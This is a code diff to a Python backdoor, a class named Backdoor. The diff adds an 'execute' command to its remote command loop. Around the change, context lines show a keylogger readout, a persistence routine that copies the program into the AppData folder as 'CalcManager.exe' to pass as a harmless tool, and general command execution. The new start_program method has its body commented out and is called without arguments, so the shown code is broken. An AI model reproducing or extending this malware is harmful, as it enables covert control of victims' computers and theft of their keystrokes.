@@ -5,9 +5,9 @@ import sys
 import os
 import threading
 import time
-import pyautogui
 import re
 import shutil
+import pyautogui
 from urllib.request import urlopen
 
 
@@ -80,6 +80,15 @@ class Backdoor:
         except Exception:
             return ''
 
+    def start_program(self, path, name):
+        print(path, name)
+  
+#        try:
+#            os.chdir(path)
+#            os.system(f"{name}")
+#        except Exception:
+#            return ''
+
     def persistence(self):
         env = os.environ['appdata']
         location = env + '\\CalcManager.exe'
@@ -151,6 +160,13 @@ class Backdoor:
                         data = self.keylogger.read_file()
                     except Exception as exc:
                         data = f'Keylogger error: {exc}'
+                
+                elif command[0] == 'execute':
+                    try:
+                        self.start_program()
+                        data = 'Program Executed'
+                    except:
+                        data = 'Program Not Executed'
 
                 else:
                     data = self.command_exec(command)
